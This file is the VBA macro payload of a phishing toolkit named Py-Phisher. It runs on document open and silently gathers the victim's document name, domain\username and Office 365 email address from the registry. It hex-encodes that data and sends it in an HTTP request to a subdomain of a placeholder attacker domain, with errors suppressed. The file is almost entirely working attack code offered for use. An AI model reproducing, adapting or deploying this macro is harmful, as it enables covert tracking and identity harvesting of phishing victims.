' Py-Phisher - A simple script for basic phishing by https://github.com/1mm0rt41PC
'
' Filename: payload.vba
'
' This program is free software; you can redistribute it and/or modify
' it under the terms of the GNU General Public License as published by
' the Free Software Foundation; either version 2 of the License, or
' (at your option) any later version.
'
' This program is distributed in the hope that it will be useful,
' but WITHOUT ANY WARRANTY; without even the implied warranty of
' MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' GNU General Public License for more details.
'
' You should have received a copy of the GNU General Public License
' along with this program; see the file COPYING. If not, write to the
' Free Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

Const MAIN_DOMAIN As String = "xxx.fr"

Public Sub Document_Open()
    Call sendRequest
End Sub

Public Sub sendRequest()
	On Error GoTo sendRequest_err
	Dim WinHttpReq As Object: Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
	Dim data As String: data = s2h(ActiveDocument.Name & "$" & Environ("userdomain") & "\" & Environ("username") & "$" & getFromO365("EmailAddress"))
	' s2h(getFromO365("FriendlyName"))
	Dim payload As String: payload = ""
	Dim fullpayload As String: fullpayload = ""
	' Split le payload
	Dim i
	For i = 0 To Len(data) - 1 Step 63
		payload = payload & "." & Mid(data, i + 1, 63)
	Next
	fullpayload = payload
	If Mid(payload, 1, 250 - 15) <> payload Then
		payload = Mid(payload, 1, 250 - 15 - 1) & "_"
	End If
	'xmlhttp.Open Method, URL, async(true or false)
	WinHttpReq.Open "GET", "http://vba" & payload & "." & MAIN_DOMAIN & "/" & fullpayload, True
	WinHttpReq.send
sendRequest_err:
	On Error GoTo 0
End Sub


Public Function getFromO365(pType As String) As String
	' pType=EmailAddress
	' pType=FriendlyName
	On Error GoTo getFromO365_err
	Const HKEY_CURRENT_USER = &H80000001
	Dim strKeyPath: strKeyPath = "Software\Microsoft\Office\16.0\Common\Identity\Identities"
	Dim oReg: Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

	oReg.EnumKey HKEY_CURRENT_USER, strKeyPath, arrSubKeys

	For Each strSubkey In arrSubKeys
		oReg.GetStringValue HKEY_CURRENT_USER, strKeyPath & "\" & strSubkey, pType, strValue
		If Not IsEmpty(strValue) Then
			getFromO365 = strValue
			Exit Function
		End If
	Next
getFromO365_err:
	On Error GoTo 0
	getFromO365 = "unk@unk.unk"
End Function

Function s2a(s)
	ReDim a(Len(s) - 1)
	Dim i
	For i = 0 To UBound(a)
		a(i) = Mid(s, i + 1, 1)
	Next
	s2a = a
End Function

Function s2h(s)
	If Len(s) = 0 Then
		s2h = ""
		Exit Function
	End If
	Dim a: a = s2a(s)
	Dim i
	For i = 0 To UBound(a)
		a(i) = Right("00" & Hex(Asc(a(i))), 2)
	Next
	s2h = Replace(Join(a), " ", "")
End Function

Function h2s(h)
	Dim a: a = Split(h)
	Dim i
	For i = 0 To UBound(a)
		a(i) = ChrW("&H" & a(i))
	Next
	h2s = Join(a, "")
End Function
